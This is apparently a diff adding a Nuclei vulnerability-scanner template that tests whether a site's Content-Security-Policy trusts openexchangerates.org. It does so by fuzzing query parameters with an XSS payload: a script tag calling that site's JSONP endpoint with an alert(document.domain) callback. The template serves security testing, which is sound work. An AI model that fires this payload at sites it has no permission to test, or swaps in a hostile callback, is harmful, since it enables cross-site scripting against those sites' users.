@@ -1,0 +1,55 @@
+id: openexchangerates-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - OpenExchangeRates
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,openexchangerates
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "openexchangerates.org"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: openexchangerates_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "openexchangerates_csp_xss == true"
+# digest: 4a0a004730450220306923f1d34c579407f3b94e65f76684286064daa6476917365b8ba85dd27cb5022100992ac1aa6b1d9d4621a14bc2836731a260f1634ab32a06bed9c9231b7b38971b:922c64590222798bb761d5b6d8e72950
